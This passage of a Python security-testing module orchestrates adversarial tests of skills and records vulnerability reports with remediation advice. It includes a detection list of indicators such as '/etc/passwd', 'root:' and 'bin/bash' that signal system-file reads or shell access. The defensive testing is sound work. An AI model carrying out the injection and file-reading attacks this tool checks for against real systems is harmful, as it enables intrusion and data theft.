            VulnerabilityType.DESERIALIZATION: "Remote code execution or denial of service.",
        }
        return impacts.get(vuln_type, "Potential for unauthorized access or data compromise.")

    def _generate_remediation(self, vuln_type: VulnerabilityType) -> str:
        """Generate remediation guidance."""
        remediations: dict[VulnerabilityType, str] = {
            VulnerabilityType.SQL_INJECTION: "Use parameterized queries or prepared statements. Implement input validation and least-privilege database access.",
            VulnerabilityType.XSS: "Implement output encoding/escaping. Use Content Security Policy (CSP). Validate and sanitize all user input.",
            VulnerabilityType.COMMAND_INJECTION: "Avoid shell commands with user input. Use safe APIs. Implement strict input validation and allowlisting.",
            VulnerabilityType.PATH_TRAVERSAL: "Validate and sanitize file paths. Use chroot jails or containerization. Implement allowlist for accessible files.",
            VulnerabilityType.XXE: "Disable DTD processing. Use JSON instead of XML where possible. Implement secure XML parsing configuration.",
            VulnerabilityType.SSRF: "Validate and allowlist URLs. Block requests to internal IP ranges. Use network segmentation.",
            VulnerabilityType.TEMPLATE_INJECTION: "Use sandboxed template engines. Avoid executing user-supplied template code. Implement strict input validation.",
            VulnerabilityType.DESERIALIZATION: "Avoid deserializing untrusted data. Use safe serialization formats (JSON). Implement integrity checks.",
        }
        return remediations.get(vuln_type, "Implement input validation and output encoding. Follow security best practices.")

    def _generate_references(self, vuln_type: VulnerabilityType) -> list[str]:
        """Generate reference links."""
        base_refs: dict[VulnerabilityType, list[str]] = {
            VulnerabilityType.SQL_INJECTION: [
                "https://owasp.org/www-community/attacks/SQL_Injection",
                "https://cwe.mitre.org/data/definitions/89.html",
            ],
            VulnerabilityType.XSS: [
                "https://owasp.org/www-community/attacks/xss/",
                "https://cwe.mitre.org/data/definitions/79.html",
            ],
            VulnerabilityType.COMMAND_INJECTION: [
                "https://owasp.org/www-community/attacks/Command_Injection",
                "https://cwe.mitre.org/data/definitions/78.html",
            ],
            VulnerabilityType.PATH_TRAVERSAL: [
                "https://owasp.org/www-community/attacks/Path_Traversal",
                "https://cwe.mitre.org/data/definitions/22.html",
            ],
        }
        return base_refs.get(vuln_type, [])

    def _enforce_limit(self) -> None:
        """Enforce max reports limit."""
        if len(self._reports) > self.max_reports:
            excess = len(self._reports) - self.max_reports
            self._reports = self._reports[excess:]

    def _persist_report(self, report: VulnerabilityReport) -> None:
        """Persist report to configured path."""
        if not self.output_path:
            return

        try:
            self.output_path.parent.mkdir(parents=True, exist_ok=True)
            # Append to file
            with open(self.output_path, "a") as f:
                f.write(json.dumps(report.to_dict()) + "\n")
        except Exception as e:
            logger.error(f"Failed to persist report: {e}")


# ============================================================================
# Gatekeeper Orchestrator
# ============================================================================

@dataclass
class GatekeeperConfig:
    """Configuration for the adversarial gatekeeper."""
    enabled: bool = True
    fail_on_critical: bool = True
    fail_on_high: bool = False
    max_test_duration_seconds: float = 60.0
    vulnerability_categories: list[str] | None = None


class AdversarialGatekeeper:
    """
    Main orchestrator for adversarial security testing.

    Coordinates malicious input generation, execution monitoring,
    and vulnerability recording.

    Validates: Requirements 8.1, 8.2, 8.3, 8.4, 8.5, 8.6

    Example:
        >>> gatekeeper = AdversarialGatekeeper()
        >>> result = gatekeeper.test_skill("my-skill", skill_executor)
        >>> result.vulnerabilities_found
        0
    """

    def __init__(
        self,
        config: GatekeeperConfig | None = None,
        *,
        input_generator: MaliciousInputGenerator | None = None,
        monitor: ExploitMonitor | None = None,
        recorder: VulnerabilityRecorder | None = None,
    ) -> None:
        """
        Initialize the gatekeeper.

        Args:
            config: Gatekeeper configuration
            input_generator: Custom input generator
            monitor: Custom exploit monitor
            recorder: Custom vulnerability recorder
        """
        self.config = config or GatekeeperConfig()
        self.input_generator = input_generator or MaliciousInputGenerator()
        self.monitor = monitor or ExploitMonitor()
        self.recorder = recorder or VulnerabilityRecorder()

    @property
    def enabled(self) -> bool:
        """Check if gatekeeping is enabled."""
        return self.config.enabled

    def test_skill(
        self,
        skill_name: str,
        executor: Callable[[str, dict[str, Any]], Any],
        *,
        inputs: list[MaliciousInput] | None = None,
    ) -> "GatekeeperResult":
        """
        Test a skill for vulnerabilities.

        Args:
            skill_name: Name of the skill to test
            executor: Function to execute skill with malicious input
            inputs: Optional custom malicious inputs

        Returns:
            GatekeeperResult with test results
        """
        if not self.config.enabled:
            logger.info(f"Adversarial testing disabled, skipping {skill_name}")
            return GatekeeperResult(
                skill_name=skill_name,
                tested=False,
                reason="Adversarial testing disabled",
            )

        logger.info(f"Starting adversarial testing for skill: {skill_name}")

        # Generate or use provided inputs
        test_inputs = inputs or list(self._generate_inputs())

        vulnerabilities: list[VulnerabilityReport] = []
        tested_count = 0
        failed_tests: list[tuple[MaliciousInput, str]] = []

        for malicious_input in test_inputs:
            tested_count += 1

            # Start monitoring
            self.monitor.start_monitoring()

            try:
                # Execute skill with malicious input
                result = executor(skill_name, {"input": malicious_input.payload})

                # Check for vulnerabilities in output
                vuln_report = self._check_for_vulnerability(
                    skill_name,
                    malicious_input,
                    result,
                )

                if vuln_report:
                    vulnerabilities.append(vuln_report)

            except Exception as e:
                # Exception might indicate a vulnerability
                failed_tests.append((malicious_input, str(e)))

                # Record as potential vulnerability
                vuln_report = self.recorder.record_vulnerability(
                    skill_name=skill_name,
                    vuln_type=malicious_input.vulnerability_type,
                    malicious_input=malicious_input,
                    stack_trace=traceback.format_exc(),
                )
                vulnerabilities.append(vuln_report)

            finally:
                # Stop monitoring and check for anomalies
                anomalies = self.monitor.stop_monitoring()

                for anomaly in anomalies:
                    if anomaly.severity in (VulnerabilitySeverity.CRITICAL, VulnerabilitySeverity.HIGH):
                        vuln_report = self.recorder.record_vulnerability(
                            skill_name=skill_name,
                            vuln_type=VulnerabilityType.INFINITE_LOOP
                            if anomaly.anomaly_type == AnomalyType.INFINITE_LOOP
                            else VulnerabilityType.MEMORY_EXHAUSTION,
                            anomaly=anomaly,
                        )
                        vulnerabilities.append(vuln_report)

        # Determine if pipeline should fail
        should_fail = self._should_fail_pipeline(vulnerabilities)

        return GatekeeperResult(
            skill_name=skill_name,
            tested=True,
            inputs_tested=tested_count,
            vulnerabilities_found=len(vulnerabilities),
            vulnerabilities=vulnerabilities,
            failed_tests=len(failed_tests),
            should_fail_pipeline=should_fail,
        )

    def _generate_inputs(self) -> Generator[MaliciousInput, None, None]:
        """Generate malicious inputs based on config."""
        categories = self.config.vulnerability_categories

        if categories is None:
            yield from self.input_generator.generate_all()
        else:
            for category in categories:
                if category == "sql_injection":
                    yield from self.input_generator.generate_sql_injection()
                elif category == "xss":
                    yield from self.input_generator.generate_xss()
                elif category == "command_injection":
                    yield from self.input_generator.generate_command_injection()
                elif category == "path_traversal":
                    yield from self.input_generator.generate_path_traversal()
                elif category == "ldap_injection":
                    yield from self.input_generator.generate_ldap_injection()
                elif category == "xxe":
                    yield from self.input_generator.generate_xxe()
                elif category == "ssrf":
                    yield from self.input_generator.generate_ssrf()
                elif category == "template_injection":
                    yield from self.input_generator.generate_template_injection()

    def _check_for_vulnerability(
        self,
        skill_name: str,
        malicious_input: MaliciousInput,
        result: Any,
    ) -> VulnerabilityReport | None:
        """Check result for vulnerability indicators."""
        if result is None:
            return None

        # Convert result to string for checking
        result_str = str(result) if not isinstance(result, str) else result

        # Check for detection patterns
        detection_pattern = malicious_input.detection_pattern
        if detection_pattern and detection_pattern.lower() in result_str.lower():
            return self.recorder.record_vulnerability(
                skill_name=skill_name,
                vuln_type=malicious_input.vulnerability_type,
                malicious_input=malicious_input,
                description=f"Detection pattern '{detection_pattern}' found in output",
            )

        # Check for error indicators
        error_indicators = [
            "sql syntax",
            "mysql",
            "postgres",
            "ORA-",
            "PLS-",
            "script error",
            "undefined",
            "stack trace",
            "exception",
            "/etc/passwd",
            "root:",
            "bin/bash",
        ]

        result_lower = result_str.lower()
        for indicator in error_indicators:
            if indicator.lower() in result_lower:
                return self.recorder.record_vulnerability(
                    skill_name=skill_name,
                    vuln_type=malicious_input.vulnerability_type,
                    malicious_input=malicious_input,
                    description=f"Error indicator '{indicator}' found in output",
                )

        return None

    def _should_fail_pipeline(self, vulnerabilities: list[VulnerabilityReport]) -> bool:
        """Determine if vulnerabilities should fail the pipeline."""
        if self.config.fail_on_critical:
            critical_count = sum(
                1 for v in vulnerabilities
                if v.severity == VulnerabilitySeverity.CRITICAL
            )
            if critical_count > 0:
                return True

        if self.config.fail_on_high:
            high_count = sum(
                1 for v in vulnerabilities
                if v.severity == VulnerabilitySeverity.HIGH
            )
            if high_count > 0:
                return True

        return False


@dataclass
class GatekeeperResult:
    """Result of adversarial gatekeeping test."""
    skill_name: str
    tested: bool
    inputs_tested: int = 0
    vulnerabilities_found: int = 0
    vulnerabilities: list[VulnerabilityReport] = field(default_factory=list)
    failed_tests: int = 0
    should_fail_pipeline: bool = False
    reason: str = ""

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary format."""
        return {
            "skillName": self.skill_name,
            "tested": self.tested,
            "inputsTested": self.inputs_tested,
            "vulnerabilitiesFound": self.vulnerabilities_found,
            "failedTests": self.failed_tests,
            "shouldFailPipeline": self.should_fail_pipeline,
            "reason": self.reason,
            "vulnerabilities": [v.to_dict() for v in self.vulnerabilities],
        }
